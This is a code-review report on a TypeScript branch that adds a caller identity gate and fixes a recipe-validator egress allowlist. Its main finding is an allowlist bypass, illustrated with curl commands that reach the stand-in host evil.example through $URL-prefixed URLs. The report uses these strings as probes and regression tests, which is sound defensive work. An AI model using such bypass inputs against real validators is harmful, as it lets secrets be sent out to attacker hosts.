# Code Review — `feature/qa-identity-gate` vs pushed `origin/master`

**Date:** 2026-06-11
**Scope:** branch `feature/qa-identity-gate` (HEAD `c631820`) ↔ pushed `origin/master` (`6fcafb9`) — 13 commits, 21 files (+2042/−20). Substantive code: the QA identity-gate (`caller-gate.ts` + wiring in `qa/index.ts`) and the H3 recipe-validator `&`-operator fix.
**Method:** 3 parallel auditors (security / code-quality / documentation) → 2-stage verification (cross-verifier + challenger). Gates verified independently: **typecheck + eslint + 79 tests green; `dist/` byte-identical to a fresh build.**

## Verdict: **Mergeable.** No CRITICAL/HIGH. The gate is **sound and fail-closed** — no bypass of the secret-minter exists.

The trust chain holds end-to-end: the registry's only writer is `dispatch.ts:422 register(createdId, task.name)` (foreground dispatch, `task.name` pre-validated); `isSetupCaller` is a **positive** `=== "zmora-setup"` check (denies on any miss); all four `execute()` handlers check the gate before any side effect. Identity derives from the server-assigned `ctx.sessionID` — no caller-supplied field, so it cannot be forged.

The findings below are about the **egress boundary in the same file the branch hardens** (1 MEDIUM, pre-existing but in-scope) and **maintainability/coverage** (LOW). None block merge.

---

### [MEDIUM] SEC-001: Egress allowlist bypass via `$VAR`-prefixed URL token
**Status:** ✅ Fixed (2026-06-11)

**ID:** SEC-001
**Location:** `src/modules/qa/recipe-validator.ts:206-211` (`hostOfURL` var-template branch)
**Category:** Security · CWE-918 / CWE-639 (egress-confinement bypass) · OWASP A01:2025
**Effort:** easy · **Status:** pre-existing on `origin/master`, but in-scope (this branch adds the userinfo + `&` defenses that funnel into this exact equality check)

**Problem:** The regex `…(\$\{?[A-Z_][A-Z0-9_]*\}?)` at line 210 is **unanchored at the tail** and returns only the captured variable. `hostOfURL` is applied to both the egress value and the recipe URL and compared for raw equality (`:368`, `:376-377`), so any suffix after the var collapses to the same token on both sides and passes. Confirmed by both verifiers tracing the real call path:

- `curl "$URL.evil.example/x"` → `ok`; bash expands to host `…evil.example`.
- `curl "$URL@evil.example/x"` → `ok`; the egress host becomes *userinfo* and curl connects to `evil.example` — the identical attack the userinfo block (lines 218-221) blocks for **literal** URLs, but the fast-path `return`s before that parse runs.

This is exploitable only when egress is itself a bare `$VAR` — which is the **common** case (every fixture uses `$URL`-style egress).

**Impact:** A recipe that passes `parse_plan` could exfiltrate run-scoped composed-env secrets to an attacker host while appearing to target the declared Egress. Bounded to MEDIUM (not HIGH): reaching `execute_recipe` now requires the new positive `zmora-setup` gate; recipes are author/plan-controlled (semi-trusted); `buildChildEnv` withholds the host's own credentials.

**Remediation:** Anchor the var to the whole authority and add regression cases next to the existing userinfo block (`binding-parser.test.ts:436`):

```ts
const varMatch = urlOrTemplate.match(
  /^(?:[a-zA-Z][a-zA-Z0-9+.-]*:\/\/)?(\$\{?[A-Z_][A-Z0-9_]*\}?)(.*)$/s,
)
if (varMatch) {
  const rest = varMatch[2] ?? ""
  const authorityTail = rest.match(/^[^/?#]*/)?.[0] ?? ""   // anything before the first / ? #
  if (/[\n@]/.test(rest) || authorityTail.length > 0) return null
  return varMatch[1] ?? null
}
```

New cases (`curl "$URL@evil.example"`, `curl "$URL.evil.example"`) must currently return `ok` (proving the hole) and `error` after the fix.

---

### [LOW] SEC-002: Background-dispatched subagents read as coordinator for the three lower-risk tools
**Status:** ✅ Fixed (2026-06-11)

**ID:** SEC-002
**Location:** `src/modules/coordinator/background.ts:54-62` · `src/modules/qa/caller-gate.ts:41`
**Category:** Security · CWE-862 (partial) · OWASP A01:2025 · **shares a root cause with ARCH-001**

**Problem:** `background.ts:62` registers only in `BackgroundTaskStore`, never in `sessionAgentRegistry`, so a background (`triglav`) child reads as `lookup === undefined` and satisfies `isCoordinatorCaller` → can call `parse_plan`/`record_input`/`preflight`.

**Impact:** Low and documented. The minter is unaffected (positive `zmora-setup`); the three reachable tools mint no secrets and key state by parent session. This is the explicitly accepted residual in the spec and the `caller-gate.ts` JSDoc.

**Remediation:** Optional — register background children with their agent name (+ `session.deleted` unregister), or close it via the test in ARCH-001's remediation. Track as a follow-up.

---

### [LOW] ARCH-001: `isCoordinatorCaller` registry-negative is an open-world footgun (not code-enforced)
**Status:** ✅ Fixed (2026-06-11)

**ID:** ARCH-001
**Location:** `src/modules/qa/caller-gate.ts:24-41`
**Category:** Architecture · least-surprise / fail-safe defaults

**Problem:** "coordinator == registry miss" is correct *today* only because the registry's sole writer registers children. Its safety rests on the unenforced convention that **no non-Perun frontmatter declares these three tools** (the spec records this as accepted, not enforced). Any future un-registered session class — or a future agent gaining one of these tools — silently inherits coordinator authority, with no test to catch it. This is the same defect as SEC-002 seen from the maintainability side; **one fix closes both.**

**Remediation:** Add a **frontmatter-sync regression test** (fail if any non-Perun agent lists `parse_plan`/`record_input`/`preflight`) and a **background-denial test** (a background-origin session is denied the three tools). Lower-churn than flipping to a positive check; both directly testable.

---

### [LOW] MAINT-001: Drift-guard test is tautological against the invariant it documents
**Status:** ✅ Fixed (2026-06-11)

**ID:** MAINT-001
**Location:** `tests/modules/qa/caller-gate.test.ts:52-62`
**Category:** Maintainability · test meaningfulness

**Problem:** `expect(SETUP_AGENT_KEY).toBe(\`zmora-${VARIANTS.find(v => v === "setup")}\`)` — the `.find(v => v === "setup")` re-derives the literal `"setup"` it searched for. Per the challenger: this **does** fail if `SETUP_AGENT_KEY` is mistyped, but it is tautological against the **variant-rename** invariant the comment claims to guard (renaming the `"setup"` variant would also rewrite the RHS). The genuine wiring invariant (registered `task.name` ↔ `SETUP_AGENT_KEY`) is pinned by the allow-case in `caller-gate-wiring.test.ts:58-65`; the first `it` is subsumed by the second.

**Remediation:** Pin against a plain `const SETUP_STACK = "setup"` (independent LHS/RHS), or drop the two cases since the wiring allow-path already pins the real invariant.

---

### [LOW] MAINT-002: Redundant `setupAgentKey` seam + duplicated `"zmora-setup"` literal in tests
**Status:** ✅ Fixed (2026-06-11)

**ID:** MAINT-002
**Location:** `src/modules/qa/caller-gate.ts:6-10,38-43` · `tests/modules/qa/caller-gate.test.ts:6`
**Category:** Maintainability · YAGNI / single-source-of-truth

**Problem:** `CallerGateDeps.setupAgentKey` is an injection seam whose only production caller passes the module's own `SETUP_AGENT_KEY`; the unit test re-declares `const SETUP_KEY = "zmora-setup"` instead of importing the constant it already imports — so a wrong constant would still pass the unit suite (it asserts against its own copy).

**Remediation:** Keep the seam (cheap, aids testability) but have the test import `SETUP_AGENT_KEY` as the single source of truth; or drop the seam and close over the constant directly.

---

### [INFO] DOC-001: `execute_recipe` forbidden-reason wording diverges from the plan literal

**ID:** DOC-001
**Location:** `src/modules/qa/index.ts:315`
**Category:** Documentation · **downgraded LOW → informational by the challenger**

**Problem:** Shipped string differs from the plan/spec literal (`"…restricted to the dispatched zmora-setup variant"`). Semantically identical, user-facing JSON, and the plan is a throwaway `docs/superpowers/` artifact. No test pins the `reason` string. **No action required**; the shipped wording is arguably clearer.

---

### [LOW] DOC-002: The two `docs/reviews/2026-06-10-*.md` describe the pre-gate world
**Status:** ✅ Fixed (2026-06-11)

**ID:** DOC-002
**Location:** `docs/reviews/2026-06-10-master-2.md:50-65` (findings H1/H2/M8)
**Category:** Documentation · staleness

**Problem:** Both review docs describe the threat model this branch closes. They're dated and framed as point-in-time runs (not "current state"), and the spec cites them as the resolved motivation — but a reader opening only `-master-2.md` could mistake H1/H2/M8 for open issues.

**Remediation:** Add a one-line "Resolved by `feature/qa-identity-gate` (caller-gate)" note next to H1/H2/M8, consistent with the repo's "keep Fixed status in the report" convention.

---

## Verification Summary

**Method:** Cross-domain correlation + adversarial challenge (Cross-Verifier + Challenger), both reading source.

| Metric | Count |
|--------|-------|
| Findings verified | 7 |
| False positives removed | 0 |
| Severity adjustments | 1 (DOC-001 LOW → informational) |
| Cross-analysis (composite) findings | 2 |

### Cross-Analysis (Security ↔ Quality ↔ Docs)

- **COMPOSITE-1 — one root cause:** SEC-002 (runtime) + ARCH-001 (maintainability) + DOC-002 (the residual isn't recorded as a *live* accepted risk) all stem from the single registry-negative encoding. A single hardening (frontmatter-sync + background-denial tests) dissolves all three. Stays LOW — bounded by the positive minter gate + read-only `triglav`.
- **COMPOSITE-2 — false-confidence coverage seam:** SEC-001 sits in the *same egress equality check* the branch hardens (`&` fix at `:316`, userinfo at `:218`), yet the most common egress shape (`$VAR`) is **structurally untestable** by the current suite (when egress is `"$URL"`, both sides reduce to `$URL`). The green, thorough-looking egress suite + the "hardening" commit message overstate coverage. Recommend fixing SEC-001 *in this branch* and not describing the egress boundary as "closed" until then.

### Challenged Findings

- **SEC-001 — KEPT at MEDIUM** (probe confirmed by code-trace; the `\n`-injection example dropped as weak — curl treats it as one malformed arg; the `@`/`.` variants are decisive). Not dropped despite being pre-existing (the branch owns this boundary); not raised to HIGH (positive gate + semi-trusted recipes + creds withheld).
- **SEC-002, ARCH-001, MAINT-001, MAINT-002, DOC-002 — KEPT at LOW.** MAINT-001's reasoning corrected (it *does* catch a key typo; it's tautological against the *rename* invariant).
- **DOC-001 — DOWNGRADED to informational.**

### Strengths (verified)

Clean SRP/DIP gate boundary (type-only dep on `_shared`, no I/O, no layer inversion); the wiring test drives the **real** plugin tools through the **same** registry instance the dispatcher writes, asserting deny **and** allow (including the minter's fail-closed-on-miss); the `&` fix correctly handles quote-state and excludes `&&`/`&>`/`>&`/`2>&1`; `dist/` hygiene exemplary; new AGENTS.md enforcement-model docs are accurate and match the code.

### Coverage gaps to close (all LOW, fold into the fixes above)

- **GAP-1** background-denial test (a background-origin session is denied `parse_plan`/`record_input`/`preflight`).
- **GAP-2** frontmatter-sync test (no non-Perun agent declares the three coordinator-only tools).
- **GAP-3** `$VAR`-suffix egress regression tests (`curl "$URL@evil.example"`, `curl "$URL.evil.example"`).
- **GAP-4** no `reason`-string assertion in the wiring test.

---

**Found 7 issues** (1 MEDIUM, 5 LOW, 1 informational). The MEDIUM (SEC-001) and its sibling coverage gaps are the only ones recommended to act on before merge; the rest are clean follow-ups.
